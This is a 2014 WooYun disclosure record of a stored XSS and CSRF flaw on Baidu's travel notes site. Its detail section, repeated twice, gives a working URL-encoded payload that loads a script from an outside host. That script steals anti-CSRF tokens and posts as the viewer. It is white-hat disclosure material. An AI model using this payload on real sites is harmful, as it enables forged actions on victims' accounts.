{"id": 49098, "wybug_id": "wooyun-2014-080369", "wybug_title": "百度某分站存储型XSS+csrf", "wybug_corp": "百度", "wybug_author": "0x_Jin", "wybug_date": "2014-10-22 15:58", "wybug_open_date": "2014-12-06 16:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "类型应用", "利用技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向公众公开  简要描述： 今天跟往常一样闲着无事打开hao123找找站来X，突然就看到百度旅游了，突然就发现点问题了，然后妈妈再也不用担心我的帖子没回复了！ 详细说明：  证明图：\n\n\n\n首先问题出在游记 --> 实用攻略处\n\n在里面输入些字符 然后点击提交 然后抓包改包。这里他会做很多次的验证 所以只修改一次是不行的！\n\nxss处就是我们的输入，虽然在前端限制了字符 但是服务端是没限制可输入字符的！可以把payload给url编码一下然后放进去！Payload:%3Cimg%20src%3Dx%20onerror%3Ddocument.body.appendChild(createElement(%2Fscript%2F.source)).src%3Dalt%20alt%3D%2F%2Fkm3.pw%3E加载 km3.pw/index.html的内容！km3.pw的内容:\n\n\nvar bdsExp=/bdstoken\" value=\"\\w{32}/;var pidExp=/\\w{24}\" name=\"pid/;var yuanma = document.all[0].outerHTMLvar postoken1 = String(bdsExp.exec(yuanma)).replace('bdstoken\" value=\"',\"\");var postoken2 = String(pidExp.exec(yuanma)).replace('\" name=\"pid',\"\");function Connection(Sendtype,url,content,callback){\tif (window.XMLHttpRequest){\t\tvar xmlhttp=new XMLHttpRequest();\t}\telse{\t\tvar xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\t} \txmlhttp.onreadystatechange=function(){\t\tif(xmlhttp.readyState==4&&xmlhttp.status==200)\t\t{\t\t\tcallback(xmlhttp.responseText);\t\t}\t}\txmlhttp.open(Sendtype,url,true);\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\txmlhttp.send(content);}Connection(\"POST\",\"http://lvyou.baidu.com/notes/post/submit\",\"content=%3Cp%3E0x_Jin%20Test%3C%2Fp%3E&nid=43cfba3e4ef59fdd26221554&bdstoken=\"+postoken1+\"&pid=\"+postoken2+\"&vcode_md5=&editorValue=%3Cp%3E0x_Jin%20Test%3C%2Fp%3E\",function(){});\n只要访问我的游记就会在我的游记下回复 0x_Jin Test！我们来看下效果：\n\n测试URL：http://lvyou.baidu.com/notes/43cfba3e4ef59fdd26221554   漏洞证明：  证明图：\n\n\n\n首先问题出在游记 --> 实用攻略处\n\n在里面输入些字符 然后点击提交 然后抓包改包。这里他会做很多次的验证 所以只修改一次是不行的！\n\nxss处就是我们的输入，虽然在前端限制了字符 但是服务端是没限制可输入字符的！可以把payload给url编码一下然后放进去！Payload:%3Cimg%20src%3Dx%20onerror%3Ddocument.body.appendChild(createElement(%2Fscript%2F.source)).src%3Dalt%20alt%3D%2F%2Fkm3.pw%3E加载 km3.pw/index.html的内容！km3.pw的内容:\n\n\nvar bdsExp=/bdstoken\" value=\"\\w{32}/;var pidExp=/\\w{24}\" name=\"pid/;var yuanma = document.all[0].outerHTMLvar postoken1 = String(bdsExp.exec(yuanma)).replace('bdstoken\" value=\"',\"\");var postoken2 = String(pidExp.exec(yuanma)).replace('\" name=\"pid',\"\");function Connection(Sendtype,url,content,callback){\tif (window.XMLHttpRequest){\t\tvar xmlhttp=new XMLHttpRequest();\t}\telse{\t\tvar xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\t} \txmlhttp.onreadystatechange=function(){\t\tif(xmlhttp.readyState==4&&xmlhttp.status==200)\t\t{\t\t\tcallback(xmlhttp.responseText);\t\t}\t}\txmlhttp.open(Sendtype,url,true);\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\txmlhttp.send(content);}Connection(\"POST\",\"http://lvyou.baidu.com/notes/post/submit\",\"content=%3Cp%3E0x_Jin%20Test%3C%2Fp%3E&nid=43cfba3e4ef59fdd26221554&bdstoken=\"+postoken1+\"&pid=\"+postoken2+\"&vcode_md5=&editorValue=%3Cp%3E0x_Jin%20Test%3C%2Fp%3E\",function(){});\n只要访问我的游记就会在我的游记下回复 0x_Jin Test！我们来看下效果：\n\n测试URL：http://lvyou.baidu.com/notes/43cfba3e4ef59fdd26221554   修复方案：  过滤吧。你们比我更专业 不是么！   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-10-24 11:21 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-22 17:58 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 百度某分站存储型XSS+csrf    \n     2014-10-22 23:07 |    \t\tphantomer \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 菜比一个。求勿喷。)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 百度某分站存储型XSS+csrf     \n     2014-10-23 08:20 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 百度某分站存储型XSS+csrf     \n     2014-10-23 10:35 |    \t\t胡来大师 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:10        | 大牛，泄了。。。)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 百度某分站存储型XSS+csrf    \n     2014-10-24 07:47 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 百度某分站存储型XSS+csrf    \n     2014-11-23 17:05 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  你关注的白帽子 百度某分站存储型XSS+csrf 发表了漏洞 0x_Jin    \n     2014-11-23 17:21 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  你关注的白帽子 百度某分站存储型XSS+csrf 发表了漏洞 0x_Jin    \n     2014-12-07 19:22 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  你关注的白帽子 百度某分站存储型XSS+csrf 发表了漏洞 0x_Jin     \n     2014-12-08 12:53 |    \t\tDKmen \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 临界点)\t\t \n  你关注的白帽子 百度某分站存储型XSS+csrf 发表了漏洞 0x_Jin     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}